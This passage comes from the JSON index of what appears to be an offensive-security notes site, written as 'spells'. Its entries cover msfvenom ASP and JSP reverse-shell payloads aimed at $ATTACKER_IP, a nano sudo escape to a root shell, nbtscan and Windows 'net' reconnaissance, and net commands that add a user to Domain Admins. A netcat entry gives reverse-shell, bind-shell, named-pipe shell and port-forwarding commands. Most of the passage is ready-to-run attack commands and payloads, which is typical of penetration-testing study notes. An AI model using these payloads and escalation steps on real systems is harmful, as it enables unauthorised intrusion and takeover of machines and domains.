0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;msfvenom&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; windows/meterpreter/reverse_tcp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tLHOST=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; LPORT=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; asp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.asp&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;jsp-scripts&quot;&gt;JSP scripts&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#jsp-scripts&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;msfvenom&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; java/jsp_shell_reverse_tcp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tLHOST=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; LPORT=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; raw&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.jsp&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/nano":{"slug":"spells/nano","filePath":"spells/nano.md","title":"nano","links":["spells/sudo"],"tags":["Application/nano","Application/sudo","AttackCycle/PrivEsc"],"content":"If nano can be run with NOPASSWD via sudo, then you can use the following to break out into a root shell:\n\nCTRL+R (read file)\nCTRL+X (execute file)\nreset; sh 1&gt;&amp;0 2&gt;&amp;0\n\nBoom!","richContent":"&lt;p&gt;If nano can be &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/sudo&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/sudo&quot;&gt;run with NOPASSWD via sudo&lt;/a&gt;, then you can use the following to break out into a root shell:&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;&lt;code&gt;CTRL+R&lt;/code&gt; (read file)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;CTRL+X&lt;/code&gt; (execute file)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;reset; sh 1&gt;&amp;#x26;0 2&gt;&amp;#x26;0&lt;/code&gt;&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;Boom!&lt;/p&gt;"},"spells/nbtscan":{"slug":"spells/nbtscan","filePath":"spells/nbtscan.md","title":"nbtscan","links":[],"tags":["Application/nbtscan","Protocol/SMB","AttackCycle/Reconnaissance"],"content":"You can scan a target machine or network using nbtscan to see what hosts are running Samba.\nnbtscan -r $NETWORK_IP/$CIDR_NETMASK\nThis won’t give you detailed user and share information, but it will at least let you know what machines to target.","richContent":"&lt;p&gt;You can scan a target machine or network using nbtscan to see what hosts are running Samba.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;nbtscan&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -r&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $NETWORK_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$CIDR_NETMASK&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This won’t give you detailed user and share information, but it will at least let you know what machines to target.&lt;/p&gt;"},"spells/net":{"slug":"spells/net","filePath":"spells/net.md","title":"net","links":["spells/whoami"],"tags":["OS/Windows","Application/net","AttackCycle/Reconnaissance","LoLBins","AttackCycle/PrivEsc"],"content":"The Windows net command is an older (but still useful) CLI multitool.\nUseful commands for reconnaissance\n\nnet users — enumerate all local users\nnet user ＄USER — retrieve information about the local user $USER\nnet users /domain — enumerate domain users\nnet user ＄USER /domain — retrieve information about the domain user $USER\nnet group /domain — enumerate domain groups\nnet group ＄GROUP /domain — show members (users only!) of domain group $GROUP (try with Domain Admins!)\nnet localgroup — enumerate local groups\nnet localgroup ＄GROUP — show members of local group $GROUP (try with Administrators!)\nnet localgroup ＄GROUP ＄USER /add — add a member to a local group (useful targets are Administrators, Backup Operators, and Remote Management Users)\nnet share — list all current shares (including some that are just control processes)\n\nNote that Windows allows for duplicate domain and local users; this is why users get prefixed by the domain or local machine name. Comparing the output of whoami and hostname will reveal if you’re logged in with a local or domain account.\nRemember that net group $GROUP /domain doesn’t show which domain groups are members of $GROUP, and thus will miss domain admins whose membership is controlled by a nested group. The only way to retrieve a full list of users in a domain group is to use PowerShell.\nManipulating users and groups\nWindows’ net command can be used to manipulate user and group information (iff you already have admin/SYSTEM privileges!). For example:\n# Change a user&#039;s password\n#\nnet user $USERNAME $PASSWORD\n \n# Add a user to a domain\n#\nnet user $USERNAME /add /domain\n \n# Make a user a domain admin\n#\nnet group &quot;Domain Admins&quot; $USERNAME /add /domain","richContent":"&lt;p&gt;The Windows net command is an older (but still useful) CLI multitool.&lt;/p&gt;\n&lt;h2 id=&quot;useful-commands-for-reconnaissance&quot;&gt;Useful commands for reconnaissance&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#useful-commands-for-reconnaissance&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;net users&lt;/code&gt; — enumerate all local users&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;net user ＄USER&lt;/code&gt; — retrieve information about the &lt;em&gt;local&lt;/em&gt; user &lt;code&gt;$USER&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;net users /domain&lt;/code&gt; — enumerate domain users&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;net user ＄USER /domain&lt;/code&gt; — retrieve information about the &lt;em&gt;domain&lt;/em&gt; user &lt;code&gt;$USER&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;net group /domain&lt;/code&gt; — enumerate domain groups&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;net group ＄GROUP /domain&lt;/code&gt; — show members (users only!) of domain group &lt;code&gt;$GROUP&lt;/code&gt; (try with &lt;code&gt;Domain Admins&lt;/code&gt;!)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;net localgroup&lt;/code&gt; — enumerate local groups&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;net localgroup ＄GROUP&lt;/code&gt; — show members of local group &lt;code&gt;$GROUP&lt;/code&gt; (try with &lt;code&gt;Administrators&lt;/code&gt;!)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;net localgroup ＄GROUP ＄USER /add&lt;/code&gt; — add a member to a local group (useful targets are &lt;code&gt;Administrators&lt;/code&gt;, &lt;code&gt;Backup Operators&lt;/code&gt;, and &lt;code&gt;Remote Management Users&lt;/code&gt;)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;net share&lt;/code&gt; — list &lt;em&gt;all&lt;/em&gt; current shares (including some that are just control processes)&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Note that Windows allows for duplicate domain and local users; this is why users get prefixed by the domain or local machine name. Comparing the output of &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/whoami&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/whoami&quot;&gt;whoami&lt;/a&gt; and hostname will reveal if you’re logged in with a local or domain account.&lt;/p&gt;\n&lt;p&gt;Remember that &lt;code&gt;net group $GROUP /domain&lt;/code&gt; doesn’t show which &lt;em&gt;domain&lt;/em&gt; groups are members of &lt;code&gt;$GROUP&lt;/code&gt;, and thus will miss domain admins whose membership is controlled by a nested group. The only way to retrieve a full list of users in a domain group is to use PowerShell.&lt;/p&gt;\n&lt;h2 id=&quot;manipulating-users-and-groups&quot;&gt;Manipulating users and groups&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#manipulating-users-and-groups&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Windows’ &lt;code&gt;net&lt;/code&gt; command can be used to &lt;em&gt;manipulate&lt;/em&gt; user and group information (&lt;em&gt;iff&lt;/em&gt; you already have admin/SYSTEM privileges!). For example:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Change a user&#039;s password&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;net user &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;USERNAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;PASSWORD&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Add a user to a domain&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;net user &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;USERNAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;add &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;domain&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Make a user a domain admin&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;net group &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Domain Admins&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;USERNAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;add &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;domain&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/netcat":{"slug":"spells/netcat","filePath":"spells/netcat.md","title":"netcat","links":["spells/XSS-attacks","spells/SQL-injection-attacks","spells/UDP","spells/TCP","spells/msfvenom","spells/Shell-stabilization","spells/Nmap"],"tags":["Application/netcat","AttackCycle/Exploitation/XSS","AttackCycle/Exploitation/SQLi","AttackCycle/LateralMovement","Application/Nmap","Protocol/TCP","Protocol/UDP","Application/Metasploit/msfvenom","AttackCycle/Reconnaissance"],"content":"The netcat binary is usually nc, but some systems have it as ncat or netcat instead.\nStart a server\nnc -l -p $PORT $HOST\nThe $HOST specification here is optional; if left off, netcat binds to 0.0.0.0.\nNote that netcat will exit once the first connection closes.\n(According to the netcat docs, it looks like nc -l $HOST $PORT should also work, but it doesn’t. I think — though I haven’t been able to verify — that what’s happening here is that -p specifies the port to listen to, while the port following the $HOST specification is the port to connect to.)\nA netcat server doesn’t have to be used just for reverse shells. For example, you can also use it to catch web requests in conjunction with XSS or SQLi attacks.\nStart a client\nnc $HOST $PORT\nSome versions of netcat support an -e flag that hooks STDIN and STDOUT of an executable to the established network connection. So something like the following will establish a reverse shell:\nnc -e /bin/bash $HOST $PORT\n\n\n                  \n                  Important\n                  \n                \n\n\nThe -e flag (and similar -c flag) is considered a security risk (for obvious reasons!) and is disabled on many systems.\n\n\n\nUseful flags\n\n-l — listen for incoming connections (rather than make an outgoing connection)\n-v — verbose\n-n — skip DNS resolution (slightly faster, less noisy on the network)\n-p — specify the port to listen to\n-u — connect using UDP instead of TCP\n-k — keep listening even after client disconnects\n\n\n\n                  \n                  Important\n                  \n                \n\n\nThe -c and -e flags, which allow netcat to hook other applications, are considered security risks (for obvious reasons!) and are disabled on many systems.\n\n\n\nReverse shells\nExample reverse shell:\n\nAttacker: nc -lvnp $LISTENER_PORT\nTarget: nc $ATTACKER_IP $LISTENER_PORT -e /bin/bash\n\nIt’s also possible to start the listener on the target and then connect from the attacker system; this is sometimes called a “bind” shell:\n\nAttacker: nc $TARGET_IP $LISTENER_PORT\nTarget: nc -lvnp $LISTENER_PORT -e /bin/bash\n\nThese are almost, but not quite, mirror images of each other.\n\n\n                  \n                  Important\n                  \n                \n\n\nThe -e flag (and similar -c flag) is considered a security risk (for obvious reasons!) and is disabled on many systems.\n\n\n\nIf the -c or -e flags aren’t available (which is normal these days), then named pipes can be used instead:\nmkfifo /tmp/p; \\\nnc -lvnp $LISTENER_PORT &lt; /tmp/p | \\\n\t/bin/sh &gt;/tmp/p 2&gt;&amp;1; \\\nrm /tmp/p\n(Note that it’s also possible to reverse the /bin/sh and netcat portions of things; what important is that the named pipe lets us loop I/O between the two applications. See the discussion of msfvenom payloads for a detailed breakdown of this pattern.)\nInitial netcat reverse shells (in particular web shells) are non-interactive.\nShell “stabilization”\nTransclude of Shell-stabilization\nPort scanning\nWith the -z option, netcat will attempt to connect to all TCP ports on the targets in a sequential fashion (if no ports are specified; otherwise just to the specified port), reporting which are open. It’s like a simple, very slow version of Nmap!\nUse -w to set the timeout in seconds.\nUse -u to try connecting over UDP rather than TCP.\nPort forwarding\nnc -lvkp $LOCAL_PORT -c &quot;nc $REMOTE_IP $REMOTE_PORT&quot;\nAs a telnet replacement\nIf you just have netcat connect to a service directly, it functions exactly like telnet.","richContent":"&lt;p&gt;The netcat binary is &lt;em&gt;usually&lt;/em&gt; nc, but some systems have it as ncat or netcat instead.&lt;/p&gt;\n&lt;h2 id=&quot;start-a-server&quot;&gt;Start a server&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#start-a-server&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;nc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -l&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $HOST&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The &lt;code&gt;$HOST&lt;/code&gt; specification here is optional; if left off, netcat binds to 0.0.0.0.&lt;/p&gt;\n&lt;p&gt;Note that netcat will exit once the first connection closes.&lt;/p&gt;\n&lt;p&gt;(According to the netcat docs, it looks like &lt;code&gt;nc -l $HOST $PORT&lt;/code&gt; should also work, but it doesn’t. I think — though I haven’t been able to verify — that what’s happening here is that &lt;code&gt;-p&lt;/code&gt; specifies the port to &lt;em&gt;listen&lt;/em&gt; to, while the port following the &lt;code&gt;$HOST&lt;/code&gt; specification is the port to &lt;em&gt;connect&lt;/em&gt; to.)&lt;/p&gt;\n&lt;p&gt;A netcat server doesn’t have to be used just for reverse shells. For example, you can also use it to catch web requests in conjunction with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/XSS-attacks&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/XSS-attacks&quot;&gt;XSS&lt;/a&gt; or &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/SQL-injection-attacks&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SQL-injection-attacks&quot;&gt;SQLi&lt;/a&gt; attacks.&lt;/p&gt;\n&lt;h2 id=&quot;start-a-client&quot;&gt;Start a client&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#start-a-client&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;nc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $HOST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $PORT&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;&lt;em&gt;Some&lt;/em&gt; versions of netcat support an &lt;code&gt;-e&lt;/code&gt; flag that hooks STDIN and STDOUT of an executable to the established network connection. So something like the following will establish a reverse shell:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;nc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -e&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /bin/bash&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $HOST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $PORT&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;blockquote class=&quot;callout important&quot; data-callout=&quot;important&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Important&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;The &lt;code&gt;-e&lt;/code&gt; flag (and similar &lt;code&gt;-c&lt;/code&gt; flag) is considered a security risk (for obvious reasons!) and is disabled on many systems.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;h2 id=&quot;useful-flags&quot;&gt;Useful flags&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#useful-flags&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; 